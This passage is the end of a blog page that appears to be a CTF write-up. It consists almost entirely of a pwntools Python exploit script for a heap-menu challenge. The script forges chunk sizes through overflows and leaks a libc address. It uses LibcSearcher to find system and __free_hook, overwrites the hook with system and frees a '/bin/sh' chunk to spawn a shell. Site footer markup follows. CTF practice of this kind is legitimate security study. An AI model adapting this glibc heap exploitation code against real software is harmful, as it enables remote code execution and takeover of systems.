p.sendlineafter(&apos;index: &apos;,str(index))</span><br><span class="line">def show(index):</span><br><span class="line">	p.sendlineafter(&apos;choice: &apos;,&apos;4&apos;)</span><br><span class="line">	p.sendlineafter(&apos;index: &apos;,str(index))</span><br><span class="line">add(0x18)</span><br><span class="line">add(0x18)</span><br><span class="line">add(0x88)</span><br><span class="line">add(0x18)</span><br><span class="line">a3=add(0x18)</span><br><span class="line">Write(a3,8,&apos;/bin/sh\x00&apos;)</span><br><span class="line">add(0x18)#5</span><br><span class="line">add(0x48)</span><br><span class="line">aaa=add(0x68)</span><br><span class="line">add(0x18)</span><br><span class="line">Write(5,0x18+10,p64(0)*3+&apos;\xc1&apos;)</span><br><span class="line">free(6)</span><br><span class="line">free(aaa)</span><br><span class="line">gan=add(0xb0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">payload=p64(0)*3+&apos;\xb1&apos;</span><br><span class="line">Write(0,0x18+10,payload)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">a1=add(0x98)</span><br><span class="line">payload=p64(0)*3+p64(0x91)</span><br><span class="line">Write(1,len(payload),payload)</span><br><span class="line">free(2)</span><br><span class="line">show(a1)</span><br><span class="line">p.recvuntil(&apos;content: &apos;)</span><br><span class="line">p.recv(40)</span><br><span class="line">main_arena_addr=u64(p.recv(8))-88-3818464</span><br><span class="line">print &quot;__libc_start_main=&gt;&quot;,hex(main_arena_addr)</span><br><span class="line">libc=LibcSearcher(&apos;__libc_start_main&apos;,main_arena_addr)</span><br><span class="line">libcbase_addr=main_arena_addr-libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">system_addr=libcbase_addr+libc.dump(&apos;system&apos;)</span><br><span class="line">free_got_addr=libcbase_addr+libc.dump(&apos;__free_hook&apos;)</span><br><span class="line">binsh_addr=libcbase_addr+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload=p64(0)*9+p64(0x71)+p64(free_got_addr-0x33)</span><br><span class="line">Write(gan,len(payload),payload)</span><br><span class="line">add(0x68)</span><br><span class="line"></span><br><span class="line">payload=p64(0)*3+p64(0x91)+p64(main_arena_addr+88+3818464)+p64(free_got_addr-0x40)</span><br><span class="line">Write(a1,len(payload),payload)</span><br><span class="line">add(0x88)</span><br><span class="line">add(0x18)</span><br><span class="line">pwnnn=add(0x68)</span><br><span class="line">payload=p64(0)*4+&apos;\x00&apos;*3+p64(system_addr)</span><br><span class="line">Write(pwnnn,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(a3)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




  </section>

  <section class="post-comments">

    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
    
</section>


</article>


            <footer class="footer">

    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno" target="_blank" rel="noopener">Huno</a></span>
    
</footer>
        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>


    

    <script src="/js/jquery.min.js"></script>
    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    
    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
